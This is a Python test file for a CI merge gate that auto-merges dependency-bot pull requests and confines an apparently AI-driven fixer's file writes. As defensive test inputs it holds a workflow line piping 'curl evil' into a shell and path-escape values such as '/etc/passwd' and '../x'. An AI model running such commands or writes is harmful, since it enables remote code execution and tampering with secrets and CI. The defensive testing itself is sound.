"""Tests the merge gate, the rules a bad review cannot get past."""

import unittest

from claude_ci.gate import ci_state, is_bot_pr, merge_gate, writable


def run(name: str, conclusion: str | None = "success", status: str = "completed") -> dict:
    """Build a check run."""
    return {"name": name, "status": status, "conclusion": conclusion}


def pr(login: str, branch: str, **extra: bool) -> dict:
    """Build a PR into main."""
    return {"author": {"login": login}, "headRefName": branch, "baseRefName": "main", **extra}


IMAGE_PATCH = """@@ -3,2 +3,2 @@
   # renovate: datasource=docker depName=ghcr.io/autobrr/qui
-  image = "ghcr.io/autobrr/qui:v1.0.0";
+  image = "ghcr.io/autobrr/qui:v1.1.0";"""


class BotPr(unittest.TestCase):
    """is_bot_pr admits only the bots on their own branches."""

    def test_bots_on_their_branches(self) -> None:
        """Renovate and Dependabot PRs qualify."""
        self.assertTrue(is_bot_pr(pr("github-actions[bot]", "renovate/immich")))
        self.assertTrue(is_bot_pr(pr("dependabot[bot]", "dependabot/nix/disko-1")))
        self.assertTrue(is_bot_pr(pr("app/dependabot", "dependabot/nix/disko-1")))
        self.assertTrue(is_bot_pr(pr("app/github-actions", "renovate/immich")))

    def test_rejects_others(self) -> None:
        """People, wrong branches, forks, drafts and other bases do not."""
        self.assertFalse(is_bot_pr(pr("someone", "renovate/immich")))
        self.assertFalse(is_bot_pr(pr("github-actions[bot]", "dependabot/nix/x")))
        self.assertFalse(is_bot_pr(pr("dependabot[bot]", "dependabot/x", isCrossRepository=True)))
        self.assertFalse(is_bot_pr(pr("dependabot[bot]", "dependabot/x", isDraft=True)))
        self.assertFalse(is_bot_pr({**pr("dependabot[bot]", "dependabot/x"), "baseRefName": "deployed"}))


class CiState(unittest.TestCase):
    """ci_state reads a commit's checks and statuses."""

    def test_green(self) -> None:
        """Passed and skipped runs are green; the dispatching job is ignored."""
        runs = [run("check"), run("build-machines (puca)"), run("promote", "skipped"), run("claude-ci", None, "in_progress")]
        self.assertEqual(ci_state(runs, [], "claude-ci"), "green")

    def test_red_on_failure(self) -> None:
        """A failed run or status is red."""
        self.assertEqual(ci_state([run("check", "failure")], [], "claude-ci"), "red")
        self.assertEqual(ci_state([run("check")], [{"state": "failure"}], "claude-ci"), "red")

    def test_pending(self) -> None:
        """Missing, queued, cancelled or pending results wait."""
        self.assertEqual(ci_state([], [], "claude-ci"), "pending")
        self.assertEqual(ci_state([run("check", None, "queued")], [], "claude-ci"), "pending")
        self.assertEqual(ci_state([run("check", "cancelled")], [], "claude-ci"), "pending")
        self.assertEqual(ci_state([run("check")], [{"state": "pending"}], "claude-ci"), "pending")


class MergeGate(unittest.TestCase):
    """merge_gate allows only what the bots normally change."""

    def test_bot_files(self) -> None:
        """Lockfiles, image lines and action pins pass."""
        files = [
            {"filename": "flake.lock", "patch": "-a\n+b"},
            {"filename": "modules/nixos/server/arr/qui.nix", "patch": IMAGE_PATCH},
            {"filename": "modules/home/core/cli/ai/pi/npm/package-lock.json"},
            {"filename": ".github/workflows/build.yml", "patch": "-      uses: actions/checkout@v5\n+      uses: actions/checkout@v6"},
        ]
        self.assertTrue(merge_gate(files, set()).ok)

    def test_nix_logic_change_blocked(self) -> None:
        """A bot changing Nix logic needs a human."""
        files = [{"filename": "modules/nixos/server/arr/qui.nix", "patch": "-  port = 1;\n+  port = 2;"}]
        self.assertFalse(merge_gate(files, set()).ok)

    def test_workflow_logic_blocked(self) -> None:
        """A workflow change beyond a pin needs a human."""
        files = [{"filename": ".github/workflows/build.yml", "patch": "+      run: curl evil | sh"}]
        self.assertFalse(merge_gate(files, set()).ok)

    def test_fixer_files_allowed(self) -> None:
        """Files the fixer changed pass."""
        files = [{"filename": "modules/nixos/server/arr/qui.nix", "patch": "-  port = 1;\n+  port = 2;"}]
        self.assertTrue(merge_gate(files, {"modules/nixos/server/arr/qui.nix"}).ok)

    def test_protected_even_for_fixer(self) -> None:
        """Secrets, CI, the runner and claude-ci never pass."""
        for path in (
            "modules/x/secrets/a.age",
            ".secrets/leprechaun/a.age",
            ".github/dependabot.yml",
            "modules/nixos/server/github-runner/github-runner.nix",
            "modules/packages/claude-ci/claude_ci/gate.py",
        ):
            self.assertFalse(merge_gate([{"filename": path, "patch": "+x"}], {path}).ok, path)
        workflow = ".github/workflows/build.yml"
        self.assertFalse(merge_gate([{"filename": workflow, "patch": "+      uses: a/b@v1"}], {workflow}).ok)


class Writable(unittest.TestCase):
    """writable confines the fixer's writes."""

    def test_paths(self) -> None:
        """Escapes, .git and protected paths are refused."""
        self.assertTrue(writable("modules/nixos/server/arr/qui.nix"))
        for path in (
            "/etc/passwd",
            "../x",
            "a/../../x",
            ".git/config",
            ".github/workflows/build.yml",
            "modules/a/secrets/b.age",
            "modules/packages/claude-ci.nix",
        ):
            self.assertFalse(writable(path), path)


if __name__ == "__main__":
    unittest.main()
